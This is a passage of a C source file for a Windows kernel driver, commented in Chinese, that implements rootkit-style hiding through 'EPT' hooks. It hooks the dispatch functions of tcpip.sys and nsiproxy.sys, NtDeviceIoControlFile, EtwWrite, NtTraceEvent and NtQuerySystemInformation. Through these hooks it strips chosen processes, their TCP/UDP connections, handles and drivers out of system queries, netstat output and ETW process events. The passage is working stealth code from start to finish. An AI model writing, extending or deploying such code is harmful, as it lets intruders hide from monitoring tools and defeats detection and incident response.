    _Inout_opt_ PVOID ParseContext,
    _Out_ PVOID* Object
);
extern POBJECT_TYPE* IoDriverObjectType;

// tcpip.sys 和 nsiproxy.sys 驱动对象
static PDRIVER_OBJECT g_TcpipDriverObject = NULL;
static PDRIVER_OBJECT g_NsiproxyDriverObject = NULL;

// 原始派遣函数
typedef NTSTATUS (*PDRIVER_DISPATCH_FUNC)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
static PDRIVER_DISPATCH_FUNC g_OriginalTcpipDeviceControl = NULL;
static PDRIVER_DISPATCH_FUNC g_OriginalNsiproxyDeviceControl = NULL;
static PDRIVER_DISPATCH_FUNC g_OriginalTcpipInternalDeviceControl = NULL;
static PDRIVER_DISPATCH_FUNC g_OriginalNsiproxyInternalDeviceControl = NULL;

// ============================================================
// TCP/IP 端点结构定义 (用于直接修改端点所有者)
// ============================================================

// InternalGetTcpTable2 函数类型
typedef NTSTATUS (*PFN_InternalGetTcpTable2)(
    PVOID* TcpTable,
    POOL_TYPE PoolType,
    ULONG TableClass
);

// InternalGetUdpTableWithOwnerPid 函数类型  
typedef NTSTATUS (*PFN_InternalGetUdpTableWithOwnerPid)(
    PVOID* UdpTable,
    POOL_TYPE PoolType,
    ULONG TableClass,
    ULONG AddressFamily
);

// 全局函数指针
static PFN_InternalGetTcpTable2 g_InternalGetTcpTable2 = NULL;
static PFN_InternalGetUdpTableWithOwnerPid g_InternalGetUdpTable = NULL;

// NSI 请求结构 (简化版本)
typedef struct _NSI_PARAM {
    ULONG Unknown1;
    ULONG Unknown2;
    ULONG Unknown3;
    ULONG ModuleId;
    ULONG ObjectIndex;
    ULONG Version;
    ULONG RowSize;
    ULONG RwParamSize;
    ULONG RoStaticParamSize;
    ULONG RoDynamicParamSize;
    PVOID Rows;
    ULONG RowCount;
    // ...其他字段
} NSI_PARAM, *PNSI_PARAM;

/*
 * 过滤 NSI 返回的行数据中的 PID
 */
static VOID FilterNsiRowPids(PVOID Rows, ULONG RowCount, ULONG RowSize)
{
    ULONG i;
    PUCHAR rowPtr;
    
    if (!Rows || RowCount == 0 || RowSize < sizeof(ULONG)) {
        return;
    }
    
    __try {
        rowPtr = (PUCHAR)Rows;
        
        // 遍历每一行，搜索并替换隐藏的 PID
        for (i = 0; i < RowCount; i++) {
            PULONG data = (PULONG)rowPtr;
            ULONG numUlongs = RowSize / sizeof(ULONG);
            ULONG j;
            
            for (j = 0; j < numUlongs; j++) {
                ULONG value = data[j];
                // 检查是否是合理的 PID 范围并且是隐藏的进程
                if (value >= 4 && value < 65536 && IsProcessHiddenById(value)) {
                    data[j] = 0;  // 替换为 0
                }
            }
            
            rowPtr += RowSize;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * IRP 完成回调 - 用于在 IRP 完成后过滤数据
 */
static NTSTATUS
TcpipIrpCompletionRoutine(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp,
    PVOID Context
)
{
    PIO_STACK_LOCATION irpSp;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Context);
    
    if (Irp->IoStatus.Status == STATUS_SUCCESS && g_HiddenProcessCount > 0) {
        irpSp = IoGetCurrentIrpStackLocation(Irp);
        
        if (irpSp->MajorFunction == IRP_MJ_DEVICE_CONTROL) {
            PVOID outputBuffer = Irp->UserBuffer;
            ULONG outputLength = (ULONG)Irp->IoStatus.Information;
            
            if (outputBuffer && outputLength > 0) {
                ScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
        }
    }
    
    // 如果原始 IRP 需要同步完成
    if (Irp->PendingReturned) {
        IoMarkIrpPending(Irp);
    }
    
    return STATUS_SUCCESS;
}

/*
 * Hook tcpip.sys 的 IRP_MJ_DEVICE_CONTROL
 */
static NTSTATUS
HookedTcpipDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PIO_STACK_LOCATION irpSp;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_OriginalTcpipDeviceControl || g_HiddenProcessCount == 0) {
        if (g_OriginalTcpipDeviceControl) {
            return g_OriginalTcpipDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    // 调用原始函数
    status = g_OriginalTcpipDeviceControl(DeviceObject, Irp);
    
    // 如果成功，过滤输出数据
    if (NT_SUCCESS(status)) {
        irpSp = IoGetCurrentIrpStackLocation(Irp);
        outputBuffer = Irp->UserBuffer;
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                ScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook nsiproxy.sys 的 IRP_MJ_DEVICE_CONTROL
 */
static NTSTATUS
HookedNsiproxyDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PIO_STACK_LOCATION irpSp;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_OriginalNsiproxyDeviceControl || g_HiddenProcessCount == 0) {
        if (g_OriginalNsiproxyDeviceControl) {
            return g_OriginalNsiproxyDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    // 调用原始函数
    status = g_OriginalNsiproxyDeviceControl(DeviceObject, Irp);
    
    // 如果成功，过滤输出数据
    if (NT_SUCCESS(status)) {
        irpSp = IoGetCurrentIrpStackLocation(Irp);
        outputBuffer = Irp->UserBuffer;
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                ScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook tcpip.sys 的 IRP_MJ_INTERNAL_DEVICE_CONTROL
 * 这是内核态组件使用的接口
 */
static NTSTATUS
HookedTcpipInternalDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_OriginalTcpipInternalDeviceControl || g_HiddenProcessCount == 0) {
        if (g_OriginalTcpipInternalDeviceControl) {
            return g_OriginalTcpipInternalDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_OriginalTcpipInternalDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        outputBuffer = Irp->UserBuffer;
        if (!outputBuffer) {
            outputBuffer = Irp->AssociatedIrp.SystemBuffer;
        }
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                ScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * Hook nsiproxy.sys 的 IRP_MJ_INTERNAL_DEVICE_CONTROL
 */
static NTSTATUS
HookedNsiproxyInternalDeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
)
{
    NTSTATUS status;
    PVOID outputBuffer;
    ULONG outputLength;
    
    if (!g_OriginalNsiproxyInternalDeviceControl || g_HiddenProcessCount == 0) {
        if (g_OriginalNsiproxyInternalDeviceControl) {
            return g_OriginalNsiproxyInternalDeviceControl(DeviceObject, Irp);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    status = g_OriginalNsiproxyInternalDeviceControl(DeviceObject, Irp);
    
    if (NT_SUCCESS(status)) {
        outputBuffer = Irp->UserBuffer;
        if (!outputBuffer) {
            outputBuffer = Irp->AssociatedIrp.SystemBuffer;
        }
        outputLength = (ULONG)Irp->IoStatus.Information;
        
        if (outputBuffer && outputLength > 0) {
            __try {
                ScanAndReplaceHiddenPids(outputBuffer, outputLength);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
            }
        }
    }
    
    return status;
}

/*
 * 安装驱动派遣函数 Hook (支持指定 MajorFunction)
 */
static NTSTATUS InstallDriverDispatchHookEx(
    PCWSTR DriverName,
    UCHAR MajorFunction,
    PDRIVER_OBJECT *OutDriverObject,
    PDRIVER_DISPATCH_FUNC *OriginalFunc,
    PDRIVER_DISPATCH_FUNC NewFunc
)
{
    NTSTATUS status;
    UNICODE_STRING driverPath;
    WCHAR fullPath[256];
    PDRIVER_OBJECT driverObject = NULL;
    
    // 构建驱动路径
    RtlStringCchPrintfW(fullPath, 256, L"\\Driver\\%ws", DriverName);
    RtlInitUnicodeString(&driverPath, fullPath);
    
    // 如果已经有驱动对象，直接使用
    if (*OutDriverObject != NULL) {
        driverObject = *OutDriverObject;
    } else {
        // 获取驱动对象
        status = ObReferenceObjectByName(
            &driverPath,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&driverObject
        );
        
        if (!NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] Failed to find driver %ws: 0x%X\n", DriverName, status);
            return status;
        }
        
        *OutDriverObject = driverObject;
    }
    
    // 保存原始派遣函数
    *OriginalFunc = (PDRIVER_DISPATCH_FUNC)driverObject->MajorFunction[MajorFunction];
    
    // 替换派遣函数
    InterlockedExchangePointer(
        (PVOID*)&driverObject->MajorFunction[MajorFunction],
        (PVOID)NewFunc
    );
    
    DbgPrint("[EPT-Hook] Hooked %ws MajorFunction[%d]: %p -> %p\n",
        DriverName, MajorFunction, *OriginalFunc, NewFunc);
    
    return STATUS_SUCCESS;
}

/*
 * 安装驱动派遣函数 Hook (IRP_MJ_DEVICE_CONTROL)
 */
static NTSTATUS InstallDriverDispatchHook(
    PCWSTR DriverName,
    PDRIVER_OBJECT *OutDriverObject,
    PDRIVER_DISPATCH_FUNC *OriginalFunc,
    PDRIVER_DISPATCH_FUNC NewFunc
)
{
    return InstallDriverDispatchHookEx(
        DriverName,
        IRP_MJ_DEVICE_CONTROL,
        OutDriverObject,
        OriginalFunc,
        NewFunc
    );
}

/*
 * 安装网络驱动 Hook
 */
static VOID InstallNetworkDriverHooks(VOID)
{
    NTSTATUS status;
    
    // ============================================================
    // Hook tcpip.sys
    // ============================================================
    if (g_TcpipDriverObject == NULL) {
        status = InstallDriverDispatchHook(
            L"tcpip",
            &g_TcpipDriverObject,
            &g_OriginalTcpipDeviceControl,
            HookedTcpipDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] tcpip.sys IRP_MJ_DEVICE_CONTROL hook installed\n");
        }
    }
    
    // Hook tcpip.sys IRP_MJ_INTERNAL_DEVICE_CONTROL (内核态接口)
    if (g_TcpipDriverObject != NULL && g_OriginalTcpipInternalDeviceControl == NULL) {
        status = InstallDriverDispatchHookEx(
            L"tcpip",
            IRP_MJ_INTERNAL_DEVICE_CONTROL,
            &g_TcpipDriverObject,
            &g_OriginalTcpipInternalDeviceControl,
            HookedTcpipInternalDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] tcpip.sys IRP_MJ_INTERNAL_DEVICE_CONTROL hook installed\n");
        }
    }
    
    // ============================================================
    // Hook nsiproxy.sys
    // ============================================================
    if (g_NsiproxyDriverObject == NULL) {
        status = InstallDriverDispatchHook(
            L"nsiproxy",
            &g_NsiproxyDriverObject,
            &g_OriginalNsiproxyDeviceControl,
            HookedNsiproxyDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] nsiproxy.sys IRP_MJ_DEVICE_CONTROL hook installed\n");
        }
    }
    
    // Hook nsiproxy.sys IRP_MJ_INTERNAL_DEVICE_CONTROL
    if (g_NsiproxyDriverObject != NULL && g_OriginalNsiproxyInternalDeviceControl == NULL) {
        status = InstallDriverDispatchHookEx(
            L"nsiproxy",
            IRP_MJ_INTERNAL_DEVICE_CONTROL,
            &g_NsiproxyDriverObject,
            &g_OriginalNsiproxyInternalDeviceControl,
            HookedNsiproxyInternalDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] nsiproxy.sys IRP_MJ_INTERNAL_DEVICE_CONTROL hook installed\n");
        }
    }
}

// ============================================================
// 网络连接过滤函数
// ============================================================

/*
 * 过滤 TCP 连接表 (IPv4)
 */
static VOID FilterTcpTable(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PMIB_TCPTABLE_OWNER_PID_EPT tcpTable;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(MIB_TCPTABLE_OWNER_PID_EPT)) {
        return;
    }
    
    __try {
        tcpTable = (PMIB_TCPTABLE_OWNER_PID_EPT)OutputBuffer;
        
        if (tcpTable->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < tcpTable->dwNumEntries; i++) {
            ULONG pid = tcpTable->table[i].dwOwningPid;
            
            if (!IsProcessHiddenById(pid)) {
                if (i != j) {
                    RtlCopyMemory(&tcpTable->table[j], &tcpTable->table[i],
                                  sizeof(MIB_TCPROW_OWNER_PID_EPT));
                }
                j++;
            }
        }
        
        tcpTable->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 过滤 UDP 连接表 (IPv4)
 */
static VOID FilterUdpTable(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PMIB_UDPTABLE_OWNER_PID_EPT udpTable;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(MIB_UDPTABLE_OWNER_PID_EPT)) {
        return;
    }
    
    __try {
        udpTable = (PMIB_UDPTABLE_OWNER_PID_EPT)OutputBuffer;
        
        if (udpTable->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < udpTable->dwNumEntries; i++) {
            ULONG pid = udpTable->table[i].dwOwningPid;
            
            if (!IsProcessHiddenById(pid)) {
                if (i != j) {
                    RtlCopyMemory(&udpTable->table[j], &udpTable->table[i],
                                  sizeof(MIB_UDPROW_OWNER_PID_EPT));
                }
                j++;
            }
        }
        
        udpTable->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 过滤 TCP6 连接表 (IPv6)
 */
static VOID FilterTcp6Table(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PMIB_TCP6TABLE_OWNER_PID_EPT tcp6Table;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(MIB_TCP6TABLE_OWNER_PID_EPT)) {
        return;
    }
    
    __try {
        tcp6Table = (PMIB_TCP6TABLE_OWNER_PID_EPT)OutputBuffer;
        
        if (tcp6Table->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < tcp6Table->dwNumEntries; i++) {
            ULONG pid = tcp6Table->table[i].dwOwningPid;
            
            if (!IsProcessHiddenById(pid)) {
                if (i != j) {
                    RtlCopyMemory(&tcp6Table->table[j], &tcp6Table->table[i],
                                  sizeof(MIB_TCP6ROW_OWNER_PID_EPT));
                }
                j++;
            }
        }
        
        tcp6Table->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 过滤 UDP6 连接表 (IPv6)
 */
static VOID FilterUdp6Table(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PMIB_UDP6TABLE_OWNER_PID_EPT udp6Table;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(MIB_UDP6TABLE_OWNER_PID_EPT)) {
        return;
    }
    
    __try {
        udp6Table = (PMIB_UDP6TABLE_OWNER_PID_EPT)OutputBuffer;
        
        if (udp6Table->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < udp6Table->dwNumEntries; i++) {
            ULONG pid = udp6Table->table[i].dwOwningPid;
            
            if (!IsProcessHiddenById(pid)) {
                if (i != j) {
                    RtlCopyMemory(&udp6Table->table[j], &udp6Table->table[i],
                                  sizeof(MIB_UDP6ROW_OWNER_PID_EPT));
                }
                j++;
            }
        }
        
        udp6Table->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 直接扫描并替换输出缓冲区中的隐藏 PID
 * 这是一个更激进但更可靠的方法
 */
static VOID ScanAndReplaceHiddenPids(PVOID Buffer, ULONG BufferLength)
{
    PULONG data;
    ULONG i;
    ULONG count;
    ULONG replaced = 0;
    
    if (!Buffer || BufferLength < sizeof(ULONG) * 2) {
        return;
    }
    
    // 检查地址是否有效（简单检查）
    if ((ULONG_PTR)Buffer < 0x10000) {
        return;  // 地址太低，可能无效
    }
    
    __try {
        data = (PULONG)Buffer;
        count = BufferLength / sizeof(ULONG);
        
        // 限制扫描数量，防止性能问题
        if (count > 100000) {
            count = 100000;
        }
        
        // 遍历缓冲区中的每个 ULONG 值
        for (i = 0; i < count; i++) {
            ULONG value = data[i];
            
            // 检查是否是合理的 PID 范围 (4 到 65535)
            // 并且是隐藏的进程
            if (value >= 4 && value < 65536 && IsProcessHiddenById(value)) {
                // 将隐藏的 PID 替换为 0 (System Idle Process)
                data[i] = 0;
                replaced++;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常
    }
}

/*
 * HookedNtDeviceIoControlFile - 过滤网络连接信息
 * 
 * netstat 和类似工具通过 IOCTL 调用获取 TCP/UDP 连接信息
 * 我们需要过滤返回的连接表中属于隐藏进程的条目
 */
NTSTATUS
NTAPI
HookedNtDeviceIoControlFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
)
{
    EPT_DIRECT_CALLBACK_BEGIN(g_NtDeviceIoControlFileHook)
    NTSTATUS status;
    PFN_NtDeviceIoControlFile originalFunc;
    ULONG actualLength = 0;
    static LONG callCount = 0;
    LONG currentCall;
    
    originalFunc = g_OriginalNtDeviceIoControlFile;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 调用原始函数
    status = originalFunc(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength
    );
    
    // 如果没有隐藏的进程或调用失败，直接返回
    if (!NT_SUCCESS(status) || g_HiddenProcessCount == 0 || OutputBuffer == NULL) {
        return status;
    }
    
    // 调试：记录调用次数（每1000次输出一次, P114 默认关）
    currentCall = InterlockedIncrement(&callCount);
    if ((currentCall % 1000) == 1) {
        HV_HOT_DBG("[EPT-Hook] HookedNtDeviceIoControlFile called %d times, IOCTL=0x%X, OutLen=%d\n",
            currentCall, IoControlCode, OutputBufferLength);
    }
    
    // 获取实际返回的数据长度
    __try {
        if (IoStatusBlock != NULL) {
            actualLength = (ULONG)IoStatusBlock->Information;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        actualLength = OutputBufferLength;
    }
    
    if (actualLength == 0) {
        actualLength = OutputBufferLength;
    }
    
    // 只处理有足够数据的情况
    if (actualLength < 8) {
        return status;
    }
    
    // 使用两种策略过滤网络连接信息
    __try {
        // 策略1: 尝试结构化过滤（针对已知的表格式）
        if (actualLength >= sizeof(MIB_TCPTABLE_OWNER_PID_EPT)) {
            PMIB_TCPTABLE_OWNER_PID_EPT table = (PMIB_TCPTABLE_OWNER_PID_EPT)OutputBuffer;
            
            // 验证这是否可能是一个有效的 TCP/UDP 表
            if (table->dwNumEntries > 0 && table->dwNumEntries < 10000) {
                SIZE_T minSize = sizeof(ULONG) + table->dwNumEntries * sizeof(MIB_TCPROW_OWNER_PID_EPT);
                
                if (actualLength >= minSize) {
                    // 看起来像 TCP 表，尝试过滤
                    FilterTcpTable(OutputBuffer, actualLength);
                }
            }
        }
        
        if (actualLength >= sizeof(MIB_UDPTABLE_OWNER_PID_EPT)) {
            PMIB_UDPTABLE_OWNER_PID_EPT table = (PMIB_UDPTABLE_OWNER_PID_EPT)OutputBuffer;
            
            if (table->dwNumEntries > 0 && table->dwNumEntries < 10000) {
                SIZE_T minSize = sizeof(ULONG) + table->dwNumEntries * sizeof(MIB_UDPROW_OWNER_PID_EPT);
                
                if (actualLength >= minSize) {
                    FilterUdpTable(OutputBuffer, actualLength);
                }
            }
        }
        
        // 策略2: 直接扫描并替换隐藏的 PID（作为备用方案）
        // 这会确保即使结构化过滤失败，PID 也会被替换
        ScanAndReplaceHiddenPids(OutputBuffer, actualLength);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 用户模式缓冲区访问异常，记录但不中断
        DbgPrint("[EPT-Hook] Exception in HookedNtDeviceIoControlFile filter\n");
    }
    
    return status;
    EPT_DIRECT_CALLBACK_END()
}

// ============================================================
// HookedEtwWrite - 过滤 ETW 进程事件
// ============================================================
/*
 * ETW 事件过滤
 * 当检测到进程创建/终止事件且涉及隐藏进程时，丢弃该事件
 * 
 * 注意：这是一个复杂的 Hook，因为 ETW 事件格式随 Provider 不同而变化
 * 我们主要关注 Microsoft-Windows-Kernel-Process provider 的事件
 */
NTSTATUS
NTAPI
HookedEtwWrite(
    PVOID  RegHandle,
    PVOID  EventDescriptor,
    LPCGUID ActivityId,
    ULONG  UserDataCount,
    PVOID  UserData
)
{
    EPT_DIRECT_CALLBACK_BEGIN(g_EtwWriteHook)
    PFN_EtwWrite originalFunc;
    PEVENT_DESCRIPTOR_EPT eventDesc;

    originalFunc = g_OriginalEtwWrite;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }

    if (!g_EtwFilterEnabled || g_HiddenProcessCount == 0) {
        return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
    }

    __try {
        if (EventDescriptor == NULL) {
            return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
        }

        eventDesc = (PEVENT_DESCRIPTOR_EPT)EventDescriptor;

        if (eventDesc->Id == ETW_PROCESS_START_EVENT_ID ||
            eventDesc->Id == ETW_PROCESS_STOP_EVENT_ID) {

            if (UserDataCount > 0 && UserData != NULL) {
                PEVENT_DATA_DESCRIPTOR_EPT dataDesc = (PEVENT_DATA_DESCRIPTOR_EPT)UserData;

                if (dataDesc->Size >= sizeof(ULONG) && dataDesc->Ptr != 0) {
                    __try {
                        ULONG eventPid = *(PULONG)(ULONG_PTR)dataDesc->Ptr;

                        if (IsProcessHiddenById(eventPid)) {
                            return STATUS_SUCCESS;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) { }
                }
            }
        }

        if (eventDesc->Id == ETW_THREAD_START_EVENT_ID ||
            eventDesc->Id == ETW_THREAD_STOP_EVENT_ID) {

            if (UserDataCount > 0 && UserData != NULL) {
                PEVENT_DATA_DESCRIPTOR_EPT dataDesc = (PEVENT_DATA_DESCRIPTOR_EPT)UserData;

                if (dataDesc->Size >= sizeof(ULONG) && dataDesc->Ptr != 0) {
                    __try {
                        ULONG eventPid = *(PULONG)(ULONG_PTR)dataDesc->Ptr;

                        if (IsProcessHiddenById(eventPid)) {
                            return STATUS_SUCCESS;
                        }
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) { }
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) { }

    return originalFunc(RegHandle, EventDescriptor, ActivityId, UserDataCount, UserData);
    EPT_DIRECT_CALLBACK_END()
}

/*
 * HookedNtTraceEvent - 过滤 NtTraceEvent 调用
 * 这是另一个可用于发送 ETW 事件的内核 API
 */
NTSTATUS
NTAPI
HookedNtTraceEvent(
    HANDLE TraceHandle,
    ULONG Flags,
    ULONG FieldSize,
    PVOID Fields
)
{
    EPT_DIRECT_CALLBACK_BEGIN(g_NtTraceEventHook)
    PFN_NtTraceEvent originalFunc;
    
    originalFunc = g_OriginalNtTraceEvent;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 如果 ETW 过滤未启用或没有隐藏进程，直接调用原函数
    if (!g_EtwFilterEnabled || g_HiddenProcessCount == 0) {
        return originalFunc(TraceHandle, Flags, FieldSize, Fields);
    }
    
    // NtTraceEvent 的事件格式更复杂，暂时只做基本检查
    // 如果需要更精确的过滤，可以解析 Fields 结构
    __try {
        if (Fields != NULL && FieldSize >= sizeof(ULONG) * 2) {
            // 尝试从 Fields 中提取进程 ID
            // 这依赖于具体的事件格式
            PULONG fieldData = (PULONG)Fields;
            ULONG possiblePid = fieldData[0];  // 第一个字段可能是 PID
            
            if (possiblePid > 4 && possiblePid < 0x10000) {  // 合理的 PID 范围
                if (IsProcessHiddenById(possiblePid)) {
                    return STATUS_SUCCESS;  // 丢弃事件
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常
    }
    
    return originalFunc(TraceHandle, Flags, FieldSize, Fields);
    EPT_DIRECT_CALLBACK_END()
}

// Hook 函数
// 警告：这个函数依赖正确的跳板代码
// 如果跳板不正确，调用 g_OriginalNtQuerySystemInformation 会崩溃
NTSTATUS
NTAPI
HookedNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
)
{
    NTSTATUS status;
    static volatile LONG callCount = 0;
    LONG currentCall;
    PFN_NtQuerySystemInformation originalFunc;
    
    // 记录调用次数
    currentCall = InterlockedIncrement(&callCount);
    // 减少日志输出以避免性能问题和潜在的 IRQL 问题
    // 仅在调试时启用
#if 0
    if (currentCall <= 3) {
        DbgPrint("[EPT-Hook] HookedNtQuerySystemInformation called #%d, Class=%d\n", 
            currentCall, SystemInformationClass);
    }
#endif
    
#if EPT_HOOK_TEST_NO_CALL
    // 测试模式：直接返回错误，不调用跳板
    return STATUS_NOT_IMPLEMENTED;
#else
    // 安全检查：获取原始函数指针的本地副本
    originalFunc = g_OriginalNtQuerySystemInformation;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 验证 Hook 管理器仍然初始化
    if (!g_EptHookManager.Initialized) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 调用原始函数（通过跳板）
    __try {
        status = originalFunc(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    // 只在成功时进行过滤
    if (!NT_SUCCESS(status) || SystemInformation == NULL) {
        return status;
    }
    
    // 根据信息类进行过滤
    __try {
        switch (SystemInformationClass) {
        
        // ============================================================
        // 进程信息过滤
        // ============================================================
        case SystemProcessInformation:           // 5
        case SystemExtendedProcessInformation:   // 57
        case SystemFullProcessInformation:       // 148
            // 这三个信息类都使用相同的 SYSTEM_PROCESS_INFORMATION 结构
            if (g_HiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(SYSTEM_PROCESS_INFORMATION_ENTRY)) {
                FilterProcessList(SystemInformation);
            }
            break;
        
        // ============================================================
        // 会话进程信息过滤
        // ============================================================
        case SystemSessionProcessInformation:    // 53
            if (g_HiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(SYSTEM_SESSION_PROCESS_INFORMATION)) {
                FilterSessionProcessList(SystemInformation);
            }
            break;
        
        // ============================================================
        // 句柄信息过滤 - 防止通过句柄发现进程
        // ============================================================
        case SystemHandleInformation:            // 16
            if (g_HiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(SYSTEM_HANDLE_INFORMATION_EPT)) {
                FilterHandleList(SystemInformation, SystemInformationLength);
            }
            break;
        
        case SystemExtendedHandleInformation:    // 64
            if (g_HiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(SYSTEM_HANDLE_INFORMATION_EX)) {
                FilterExtendedHandleList(SystemInformation, SystemInformationLength);
            }
            break;
        
        // ============================================================
        // 模块信息过滤 - 隐藏驱动
        // ============================================================
        case 11:  // SystemModuleInformation
            if (g_HiddenDriverCount > 0 &&
                SystemInformationLength >= sizeof(RTL_PROCESS_MODULES_EPT)) {
                PRTL_PROCESS_MODULES_EPT modules = (PRTL_PROCESS_MODULES_EPT)SystemInformation;
                if (modules->NumberOfModules > 0) {
                    EptFilterModuleList(modules);
                }
            }
            break;
        
        default:
            // 其他信息类不处理
            break;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 过滤失败不影响返回原始数据
    }
    
    return status;
#endif
}

/*
 * 安装进程隐藏 Hook
 */
NTSTATUS
EptHookHideProcess(
    _In_ ULONG ProcessId
)
{
    NTSTATUS status;
    UNICODE_STRING funcName;
    PVOID ntQuerySystemInformation;
    PUCHAR funcBytes;
    
    DbgPrint("[EPT-Hook] ============ EptHookHideProcess START ============\n");
    DbgPrint("[EPT-Hook] Request to hide PID: %d\n", ProcessId);

    if (ProcessId == 0 || ProcessId == 4) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 检查是否所有进程隐藏相关的 Hook 都已安装
    // 注意：NtQuerySystemInformation 可能已被驱动隐藏功能安装
    // NtDeviceIoControlFile Hook 已禁用（导致系统不稳定）
    if (g_NtGetNextProcessHook != NULL &&
        g_OriginalNtGetNextProcess != NULL) {
        status = EptHookAddHiddenProcessState(ProcessId);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        DbgPrint("[EPT-Hook] All process hiding hooks already installed, PID added to list\n");
        return STATUS_SUCCESS;
    }
    
    DbgPrint("[EPT-Hook] Installing additional process hiding hooks...\n");
    DbgPrint("[EPT-Hook]   NtQuerySystemInformation: %s\n", g_NtQuerySystemInformationHook ? "installed" : "pending");
    DbgPrint("[EPT-Hook]   NtDeviceIoControlFile: %s\n", g_NtDeviceIoControlFileHook ? "installed" : "pending");
